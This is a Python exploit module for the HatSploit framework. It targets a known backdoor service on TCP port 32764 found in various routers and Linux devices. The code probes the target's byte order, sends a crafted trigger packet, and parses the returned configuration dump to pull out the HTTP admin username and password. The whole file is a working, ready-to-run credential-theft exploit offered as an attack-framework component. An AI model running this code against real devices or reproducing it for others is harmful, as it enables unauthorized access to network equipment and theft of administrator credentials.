#!/usr/bin/env python3

#
# This module requires HatSploit: https://hatsploit.com
# Current source: https://github.com/EntySec/HatSploit
#

import re
import struct

from hatsploit.lib.module import Module
from pex.proto.http import HTTPClient
from pex.proto.tcp import TCPClient


class HatSploitModule(Module, HTTPClient, TCPClient):
    details = {
        'Category': "exploit",
        'Name': "TCP 32764 Backdoor Credentials Disclosure",
        'Module': "exploit/linux/generic/32764_credentials_disclosure",
        'Authors': ['Ivan Nikolsky (enty8080) - module developer'],
        'Description': "Credentials disclosure in multiple devices through TCP 32764 backdoor.",
        'Platform': "linux",
        'Rank': "high",
    }

    options = {
        'HOST': {
            'Description': "Remote host.",
            'Value': None,
            'Type': "ip",
            'Required': True,
        }
    }

    commands = {
        'get_endian': {
            'Description': "Get target device endian.",
            'Usage': "get_endian <remote_host>",
            'MinArgs': 1,
        }
    }

    def detect_endian(self, remote_host):
        client = self.open_tcp(remote_host, 32764)
        client.connect()

        client.send(b"abcde")
        response = client.recv(0xC)
        client.disconnect()

        if len(response) < 12:
            return None

        sig, ret_val, ret_len = struct.unpack('<III', response)
        if sig == 0x53634D4D:
            return '<'
        if sig == 0x4D4D6353:
            return '>'
        return None

    def get_endian(self, argc, argv):
        self.print_process("Detecting endian...")
        endian = self.detect_endian(argv[1])

        if endian == '<':
            self.print_information("Endian detected: little")
        elif endian == '>':
            self.print_information("Endian detected: big")
        else:
            self.print_error("Failed to detect endian!")

    def exploit(self, remote_host):
        endian = self.detect_endian(remote_host)

        if endian is None:
            return

        headers = struct.pack(endian + 'III', 0x53634D4D, 1, 1)
        trigger = headers + b'\x00'

        client = self.open_tcp(remote_host, 32764)
        client.connect()

        client.send(trigger)
        response = client.recv(0xC)

        if len(response) < 12:
            self.print_warning("Target vulnerable, but no credentials found.")
            client.disconnect()
            return

        sig, ret_val, ret_len = struct.unpack(endian + 'III', response)
        response = client.recv(ret_len)
        client.disconnect()

        lines = re.split("\x00|\x01", response.decode())
        pattern = re.compile('user(name)?|password|login')

        username, password = "", ""
        for line in lines:
            try:
                variable, value = line.split("=")
                if len(value) > 0 and pattern.search(variable):
                    if variable == 'http_username':
                        username = value
                    elif variable == 'http_password':
                        password = value
            except Exception:
                pass

        if username and password:
            self.print_table(
                "Credentials", ('Username', 'Password'), (username, password)
            )
        else:
            self.print_warning("Target vulnerable, but no credentials found.")

    def check(self):
        remote_host = self.parse_options(self.options)

        if not self.check_tcp_port(remote_host, 32764):
            return False

        return True

    def run(self):
        remote_host = self.parse_options(self.options)

        self.exploit(remote_host)
